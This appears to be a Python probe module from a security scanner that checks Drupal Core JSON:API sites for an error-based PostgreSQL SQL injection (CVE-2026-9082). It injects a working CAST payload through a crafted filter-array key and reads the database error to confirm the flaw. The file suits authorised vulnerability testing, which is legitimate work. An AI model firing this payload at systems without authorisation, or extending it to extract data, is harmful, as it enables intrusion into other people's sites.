"""
Raw execution for drupal_jsonapi_sqli_probe (CVE-2026-9082).
Probes Drupal Core JSON:API for error-based SQL injection vulnerability
in filter condition key processing.
No parsing here -- parse.py's job.
"""
from __future__ import annotations

import json
from dataclasses import dataclass
from typing import Any, Dict, Optional

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Tradecraft/1.0"


@dataclass
class RawDrupalSqliResult:
    target: str = ""
    base_url: str = ""
    path: str = ""
    drupal_detected: bool = False
    jsonapi_accessible: bool = False
    baseline_status: Optional[int] = None
    probe_status: Optional[int] = None
    probe_error_detail: str = ""
    sqli_confirmed: bool = False
    error: Optional[str] = None


def normalize_target_url(target: str) -> str:
    t = target.strip()
    if not t.startswith("http://") and not t.startswith("https://"):
        t = f"https://{t}"
    return t.rstrip("/")


def execute(
    target: str,
    path: str = "/jsonapi/node/article",
    host_header: Optional[str] = None,
    timeout: int = 8,
) -> RawDrupalSqliResult:
    if requests is None:
        return RawDrupalSqliResult(target=target, error="requests library not available")

    if not target or not target.strip():
        return RawDrupalSqliResult(target="", error="target is required")

    base_url = normalize_target_url(target)
    endpoint_path = path if path.startswith("/") else f"/{path}"
    result = RawDrupalSqliResult(target=target.strip(), base_url=base_url, path=endpoint_path)

    session = requests.Session()
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "application/vnd.api+json",
        "Content-Type": "application/vnd.api+json",
    }
    if host_header and host_header.strip():
        headers["Host"] = host_header.strip()

    session.headers.update(headers)

    # Step 1: Baseline check on endpoint
    try:
        r_base = session.get(
            f"{base_url}{endpoint_path}",
            timeout=timeout,
            verify=False,
            allow_redirects=True,
        )
        result.baseline_status = r_base.status_code
        base_headers_str = str(r_base.headers).lower()
        base_text = r_base.text or ""

        if "x-generator" in base_headers_str and "drupal" in base_headers_str:
            result.drupal_detected = True
        elif "x-drupal-cache" in base_headers_str or "x-drupal-dynamic-cache" in base_headers_str:
            result.drupal_detected = True
        elif "drupal" in base_text.lower():
            result.drupal_detected = True

        if r_base.status_code in (200, 400, 403, 404):
            ct = r_base.headers.get("Content-Type", "").lower()
            if "vnd.api+json" in ct or "application/json" in ct:
                result.jsonapi_accessible = True
    except requests.exceptions.RequestException as e:
        result.error = f"Baseline request failed: {e}"
        return result

    # Step 2: Error-based SQL injection probe payload
    # In Drupal Core CVE-2026-9082, user-controlled array keys in filter condition values
    # are improperly passed into SQL expressions under PostgreSQL.
    # Payload tests CAST error: 0||CAST(('RS_SQLI_TEST') AS INTEGER)
    sqli_probe_expr = "0||CAST(('RS_SQLI_TEST') AS INTEGER)"
    params = {
        "filter[rs_test][condition][path]": "title",
        "filter[rs_test][condition][operator]": "IN",
        "filter[rs_test][condition][value][0]": "Tradecraft",
        f"filter[rs_test][condition][value][{sqli_probe_expr}]": "Injection",
    }

    try:
        r_probe = session.get(
            f"{base_url}{endpoint_path}",
            params=params,
            timeout=timeout,
            verify=False,
            allow_redirects=True,
        )
        result.probe_status = r_probe.status_code
        probe_text = r_probe.text or ""

        if r_probe.status_code == 500:
            try:
                data = r_probe.json()
                errors = data.get("errors", [])
                for err in errors:
                    detail = err.get("detail", "")
                    if (
                        "invalid input syntax for integer" in detail.lower()
                        or "invalid input syntax for type integer" in detail.lower()
                        or "rs_sqli_test" in detail.lower()
                    ):
                        result.sqli_confirmed = True
                        result.probe_error_detail = detail[:500]
                        break
            except (ValueError, json.JSONDecodeError, AttributeError):
                if (
                    "invalid input syntax for integer" in probe_text.lower()
                    or "rs_sqli_test" in probe_text.lower()
                ):
                    result.sqli_confirmed = True
                    result.probe_error_detail = probe_text[:500]

    except requests.exceptions.RequestException as e:
        if not result.error:
            result.error = f"SQLi probe request failed: {e}"

    return result
